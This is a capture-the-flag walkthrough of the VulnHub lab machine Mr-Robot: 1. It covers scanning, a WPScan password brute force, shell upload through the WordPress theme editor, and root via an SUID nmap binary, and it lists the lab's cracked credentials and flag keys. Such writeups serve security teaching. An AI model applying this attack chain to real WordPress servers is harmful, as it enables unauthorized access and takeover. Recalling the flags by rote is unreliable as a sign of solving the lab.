# Mr-Robot: 1 (VulnHub)

## Overview

**Mr-Robot: 1** is one of the most popular VulnHub machines created by **Leon Johnson** and inspired by the television series *Mr. Robot*. The machine focuses on web application enumeration, WordPress exploitation, credential discovery, password cracking, privilege escalation, and post-exploitation techniques. 

The objective is to retrieve all three hidden keys and obtain root access by exploiting multiple weaknesses throughout the system.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Mr-Robot: 1 |
| Author | Leon Johnson |
| Series | Mr-Robot |
| Platform | VulnHub |
| Release Date | 28 June 2016 |
| Difficulty | Beginner / Intermediate |
| Target OS | Linux |
| Category | WordPress Enumeration, Credential Attacks, Privilege Escalation |

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Web Application Enumeration
- Directory Brute Forcing
- robots.txt Analysis
- WordPress Enumeration
- Username Discovery
- Credential Attacks
- WPScan Usage
- Reverse Shell Deployment
- Linux Enumeration
- Password Hash Cracking
- Privilege Escalation
- SUID Exploitation
- Post Exploitation

## Tools Used

- Netdiscover
- Nmap
- Gobuster
- Hydra
- WPScan
- Netcat
- CrackStation
- Linux Enumeration Commands

## Attack Methodology

1. Network Discovery
2. Port Enumeration
3. Website Enumeration
4. robots.txt Analysis
5. Username Enumeration
6. WordPress Credential Attack
7. WordPress Dashboard Access
8. Reverse Shell Upload
9. Initial Shell Access
10. Robot User Access
11. Password Hash Cracking
12. SUID Nmap Exploitation
13. Root Access
14. Key Retrieval

---

## Network Discovery

Identify active hosts on the network.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.3
```

Target successfully identified.

---

## Port Scanning

Perform a full TCP scan with service detection.

```bash
sudo nmap -sV -A -p- 192.168.10.3 --min-rate 10000
```

### Open Ports

| Port | Service |
|--------|---------|
| 80 | HTTP |
| 443 | HTTPS |

### Interesting Findings

```text
Apache Web Server
HTTPS Enabled
```

---

## Website Enumeration

Directory brute-force scan:

```bash
gobuster dir -u http://192.168.10.3/ \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
-x php,html,txt,old,bak
```

### Important Discoveries

```text
/robots.txt
/wp-login.php
/license.txt
/blog
/intro
```

---

## robots.txt Analysis

Navigate to:

```text
http://192.168.10.3/robots.txt
```

Contents:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two valuable files were exposed publicly. 

---

## Key 1

Navigate to:

```text
http://192.168.10.3/key-1-of-3.txt
```

Contents:

```text
073403c8a58a1f80d943455fb30724b9
```

First key successfully retrieved. 

---

## Wordlist Discovery

Download:

```text
http://192.168.10.3/fsocity.dic
```

The dictionary contains more than 850,000 entries with numerous duplicates. 

Optimize the wordlist:

```bash
cat fsocity.dic | sort | uniq > fsocity_filtered.disc
```

---

## Username Enumeration

Navigate to:

```text
http://192.168.10.3/wp-login.php
```

The WordPress login page reveals different error messages for valid and invalid usernames, enabling username enumeration. 

Valid username discovered:

```text
elliot
```

---

## Password Attack

Use WPScan with the discovered username:

```bash
wpscan --url http://192.168.10.3/ \
--usernames elliot \
--passwords ./fsocity_filtered.disc
```

### Credentials Found

```text
Username: elliot
Password: ER28-0652
```

---

## WordPress Dashboard Access

Authenticate using the discovered credentials.

```text
Username: elliot
Password: ER28-0652
```

Successful authentication grants access to the WordPress administration panel.

---

## Initial Access

After obtaining WordPress administrator access, a PHP shell can be deployed through the theme editor functionality to gain command execution on the target system. The resulting shell executes with the privileges of the web service account. 

### Current User

```text
daemon
```

---

## User Enumeration

Navigate to:

```bash
cd /home/robot
ls
```

Interesting files:

```text
key-2-of-3.txt
password.raw-md5
```

The second key is inaccessible initially, but the password hash file is readable. 

### Password Hash

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

---

## Password Recovery

The recovered password allows switching to the robot user account. 

### Robot User

```text
robot
```

---

## Key 2

Retrieve the second key.

```text
822c73956184f694993bede3eb39f959
```

---

## Privilege Escalation Enumeration

Search for SUID binaries:

```bash
find / -type f -perm /4000 2>/dev/null
```

Interesting discovery:

```text
/usr/local/bin/nmap
```

An old SUID-enabled Nmap binary is present on the system.

---

## Privilege Escalation

The vulnerable Nmap version can be abused to obtain elevated privileges through its interactive functionality. 

### Root Access Verification

```text
uid=1002(robot)
euid=0(root)
```

Root shell successfully obtained. 

---

## Key 3

Final key retrieved from the root directory.

```text
04787ddef27c3dee1ee161b21670b4e4
```

---

## Vulnerabilities Identified

### Information Disclosure

The robots.txt file exposed:

```text
fsocity.dic
key-1-of-3.txt
```

### Username Enumeration

Different login error messages revealed valid WordPress usernames.

### Weak Credentials

Credentials were recoverable from publicly accessible resources.

### WordPress Theme Editor Abuse

Authenticated users could modify PHP files through the theme editor, enabling remote code execution.

### SUID Nmap Privilege Escalation

A vulnerable SUID-enabled Nmap binary allowed privilege escalation to root. 

---

## Attack Chain Summary

```text
Network Enumeration
        ↓
Website Enumeration
        ↓
robots.txt Discovery
        ↓
Wordlist Discovery
        ↓
Username Enumeration
        ↓
Credential Discovery
        ↓
WordPress Admin Access
        ↓
Initial Shell Access
        ↓
Robot User Access
        ↓
Privilege Escalation
        ↓
Root Access
```


---

## Security Recommendations

- Restrict sensitive files from public access.
- Disable username enumeration.
- Enforce strong password policies.
- Remove unnecessary administrative features.
- Keep WordPress and plugins updated.
- Audit SUID binaries regularly.
- Apply the principle of least privilege.
- Conduct periodic security assessments.
- Implement file integrity monitoring.
- Harden web server configurations.

---

## Keys Retrieved

### Key 1

```text
073403c8a58a1f80d943455fb30724b9
```

### Key 2

```text
822c73956184f694993bede3eb39f959
```

### Key 3

```text
04787ddef27c3dee1ee161b21670b4e4
```

---

## Key Learning Outcomes

- Importance of web enumeration.
- Risks of exposed sensitive files.
- WordPress security weaknesses.
- Credential attack methodologies.
- Password recovery techniques.
- Linux privilege escalation fundamentals.
- SUID binary abuse.
- Post-exploitation enumeration.
- Defense-in-depth principles.

---

## Conclusion

Mr-Robot: 1 is an excellent VulnHub machine for learning web application reconnaissance, WordPress security assessment, credential attacks, Linux enumeration, and privilege escalation. The challenge demonstrates how multiple low-severity weaknesses can be chained together to achieve complete system compromise. 

---

**Author:** Omkar Babaji Sawant  
**Repository:** VulnHub-Walkthroughs
